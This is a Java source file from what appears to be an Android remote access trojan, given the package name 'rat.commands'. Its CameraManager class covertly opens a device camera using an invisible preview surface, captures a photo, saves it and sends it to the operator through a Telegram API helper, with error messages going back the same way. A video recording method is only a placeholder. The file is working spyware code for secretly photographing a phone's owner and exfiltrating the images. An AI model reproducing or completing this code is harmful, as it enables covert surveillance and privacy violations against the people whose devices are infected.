package com.enterprise.rat.commands;

import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import android.media.MediaRecorder;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.io.FileOutputStream;

@SuppressWarnings("deprecation")
public class CameraManager {
    private Context context;

    public CameraManager(Context context) { this.context = context; }

    public void takePhoto(int cameraId) {
        try {
            final Camera camera = Camera.open(cameraId);
            SurfaceTexture st = new SurfaceTexture(0);
            camera.setPreviewTexture(st);
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    File photoFile = new File(context.getCacheDir(), "snap.jpg");
                    FileOutputStream fos = new FileOutputStream(photoFile);
                    fos.write(data);
                    fos.close();
                    TelegramApi.sendPhoto(photoFile, "📸 Captured from Camera " + cameraId);
                } catch (Exception e) { TelegramApi.sendMessage("❌ Save error"); }
                cam.release();
            });
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Camera Error: " + e.getMessage());
        }
    }

    public void recordVideo(int durationSeconds) {
        TelegramApi.sendMessage("🎥 Video recording placeholder (" + durationSeconds + "s)");
    }
}
